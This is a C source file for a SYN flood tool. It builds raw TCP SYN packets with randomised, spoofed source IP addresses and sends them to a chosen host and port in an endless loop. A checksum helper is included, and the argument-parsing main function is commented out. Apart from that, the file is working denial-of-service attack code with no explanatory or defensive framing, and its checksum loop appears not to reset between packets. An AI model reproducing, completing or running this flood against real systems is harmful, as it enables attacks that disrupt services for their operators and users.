#include<sys/socket.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<errno.h>
#include<stdlib.h>
#include<stdio.h>
#include<netinet/ip.h>
#include<netinet/tcp.h>
#include<netdb.h>
#include<ctype.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
void write_syn(int fd, struct sockaddr_in* addr);
unsigned short tcpcksum(struct ip * ip);

//int main(int argc, char *argv[]) {
//    int fd;
//    int on = 1;
//    struct sockaddr_in client;
//    struct hostent *host;
//    if (argc != 3) {
//        printf("lack of parameter!");
//        exit(1);
//    }
//    bzero(&client, sizeof (struct sockaddr_in));
//    client.sin_family = AF_INET;
//    client.sin_port = htons(atoi(argv[2]));
//   // if (inet_aton(argv[1], &client.sin_addr) == 0) 
//    {
//        host = gethostbyname(argv[1]);
//        if (host == NULL) {
//            printf("gethostbyname error!");
//            exit(1);
//        }
//        client.sin_addr = *(struct in_addr*) host->h_addr_list[0];
//    }
//    fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
//    if (fd < 0) {
//        printf("get no socket id!\n");
//        exit(1);
//    }
//    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof (on)) < 0) {
//        printf("setsockopt error!\n");
//        exit(1);
//    }
//    write_syn(fd, &client);
//    exit(0);
//}

void write_syn(int fd, struct sockaddr_in* addr) {

    char buf[1024];
    bzero(buf, sizeof (buf));
    struct ip *ip;
    struct tcphdr *tcp;
    int len = sizeof (struct ip) + sizeof (struct tcphdr);
    tcp = (struct tcphdr*) (buf + sizeof (struct ip));
    tcp->th_sport = htons(1500);
    tcp->th_dport = addr->sin_port;
    tcp->th_seq = random();
    tcp->th_ack = 0;
    tcp->th_off = 5;
    tcp->th_flags = TH_SYN;
    ip = (struct ip*) buf;
    ip->ip_v = 4;
    ip->ip_hl = sizeof (struct ip) >> 2;
    ip->ip_tos = 0;
    ip->ip_len = htons(len);
    ip->ip_id = 0;
    ip->ip_off = 0;
    ip->ip_ttl = 255;
    ip->ip_p = IPPROTO_TCP;
    ip->ip_sum = 0;
    ip->ip_dst = addr->sin_addr;
    for (;;) {
        ip->ip_src.s_addr = random();
        tcp->th_sum = tcpcksum(ip);

        if (sendto(fd, buf, len, 0, (struct sockaddr*) addr, sizeof (struct sockaddr_in)) < 0) {
            fprintf(stdout, "error . %d\n", errno);
        }
    }
}

unsigned short tcpcksum(struct ip * ip) {
    struct tcphdr * tcp;
    unsigned short * sptr, len;
    unsigned long tcksum;
    int i;
    tcksum = 0;
    tcp = (struct tcphdr*) (ip + 1);
    sptr = (unsigned short *) ip + 6; //89
    for (i = 0; i < 4; i++) {
        tcksum += *sptr++;
    }
    sptr = (unsigned short *) tcp;
    len = ntohs(ip->ip_len)-(ip->ip_hl << 2);
    tcksum += IPPROTO_TCP + len;
    if (len % 2) {
        ((char *) tcp)[len] = 0;
        len += 1;

    }
    len >>= 1;
    for (i = 0; i < len; i++) {
        tcksum += *sptr++;
    }
    tcksum = (tcksum >> 16)+(tcksum & 0xffff);
    tcksum += (tcksum >> 16);
    return (short) (tcksum & 0xffff);

}

